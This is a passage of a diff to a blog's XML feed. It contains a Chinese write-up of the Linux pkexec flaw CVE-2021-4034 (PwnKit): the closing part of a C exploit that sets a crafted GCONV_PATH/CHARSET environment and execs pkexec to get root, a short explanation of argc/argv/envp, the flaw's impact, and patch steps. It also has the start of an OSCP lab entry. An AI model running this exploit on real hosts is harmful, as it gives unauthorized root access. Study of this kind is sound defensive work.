@luijait (0x6c75696a616974)&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><br>banner();<br><br>enviroment();<br><br><span class="hljs-type">char</span> * <span class="hljs-type">const</span> idk[] = &#123;<br><span class="hljs-literal">NULL</span><br>&#125;;<br><span class="hljs-type">char</span> * <span class="hljs-type">const</span> entorno[] = &#123;<span class="hljs-string">&quot;tmp&quot;</span>, <br>  <span class="hljs-string">&quot;PATH=GCONV_PATH=.&quot;</span>, <br>  <span class="hljs-string">&quot;SHELL=/random&quot;</span>, <br>  <span class="hljs-string">&quot;CHARSET=PWNKIT&quot;</span>,<br>  <span class="hljs-string">&quot;GIO_USE_VFS=&quot;</span>,<span class="hljs-literal">NULL</span><br> &#125;;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Enjoy your root if exploit was completed succesfully\n&quot;</span>);<br><span class="hljs-keyword">return</span> execve(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, idk, entorno);<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-利用脚本基本解释">4.2 利用脚本基本解释</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">argc</span>表示有多少个命令行参数，第一个就是执行程序名，所以<span class="hljs-built_in">argc</span>最少为<span class="hljs-number">1</span>。<br><span class="hljs-built_in">argv</span>是具体的参数。<br>envp是系统的环境变量。 常规形式： “名称=值”的，以NULL结束。<br><br>char *<span class="hljs-built_in">argv</span>[ ] 表示命令行参数的字符串数组，用来存放指向字符串参数的指针数组，每个元素指向一个参数。<br>envp 存放当前程序运行环境的参数<br><span class="hljs-keyword">int</span> <span class="hljs-built_in">argc</span>表示命令行字串的个数。<br></code></pre></td></tr></table></figure><h1>5. 漏洞危害</h1><blockquote><p>pkexec 应用程序是一个 setuid 工具，旨在允许非特权用户根据预定义的策略以特权用户身份运行命令。由于当前版本的 pkexec 无法正确处理调用参数计数，并最终会尝试将环境变量作为命令执行。攻击者可以通过控制环境变量，从而诱导 pkexec 执行任意代码。利用成功后，可导致非特权用户获得管理员权限。</p></blockquote><h1>6. 修复建议</h1><h2 id="6-1-缓解措施：">6.1 缓解措施：</h2><blockquote><p>chmod 0755 /usr/bin/pkexec</p></blockquote><h2 id="6-2-修复措施">6.2 修复措施</h2><blockquote><p>rpm -Uvh polkit-0.112-26.el7_9.1.x86_64.rpm</p><p>rpm -aq | grep polkit查看Polkit是否为安全版本</p></blockquote>]]></content>
+    
+    
+    <categories>
+      
+      <category>CVE</category>
+      
+      <category>Linux</category>
+      
+      <category>CVE-2021-4034</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE</tag>
+      
+      <tag>漏洞</tag>
+      
+      <tag>Linux</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>BTRSys2.1练习</title>
+    <link href="/2024/01/25/%E8%AF%81%E4%B9%A6/OSCP/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/BTRSys2.1/"/>
+    <url>/2024/01/25/%E8%AF%81%E4%B9%A6/OSCP/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/BTRSys2.1/</url>
+    
+    <content type="html"><![CDATA[<h1>1. 开启靶场</h1><p><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/c9c9fa3d-79a8-50b6-b71e-222e3747f73d.png" alt="image-20240125172355256"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>证书</category>
+      
+      <category>OSCP</category>
+      
+      <category>靶场学习</category>
+      
+      <category>BTRSys2.1练习</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>OSCP</tag>
+      
+      <tag>证书</tag>
+      
+      <tag>靶机</tag>
+      
+    </tags>
     
   </entry>
   
